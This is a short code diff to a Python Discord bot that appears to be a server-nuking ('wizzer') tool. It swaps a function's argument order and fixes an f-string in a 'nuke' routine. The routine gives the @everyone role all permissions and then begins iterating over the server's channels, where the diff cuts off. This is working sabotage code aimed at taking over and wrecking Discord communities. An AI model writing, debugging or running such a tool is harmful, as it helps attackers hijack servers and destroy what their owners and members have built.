@@ -28,12 +28,12 @@ async def status_task():
         await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name="SIKE, beamed by 1337"))
         await asyncio.sleep(120)
 
-async def nuke(message, guild):
+async def nuke(guild, message):
   print(f"{C.WHITE}Nuking {guild.name} ~ Using 1337 wizzer.")
   role = discord.utils.get(guild.roles, name = "@everyone")
   try:
     await role.edit(permissions = discord.Permissions.all())
-    print(f"{C.GREEN}[+] [Everyone Perms] Success ~ {C.WHITE}{.guild.name}\n")
+    print(f"{C.GREEN}[+] [Everyone Perms] Success ~ {C.WHITE}{guild.name}\n")
   except:
     print(f"{C.RED}[-] [Everyone Perms] Failed ~ {C.WHITE}{guild.name}\n")
   for channel in guild.channels:
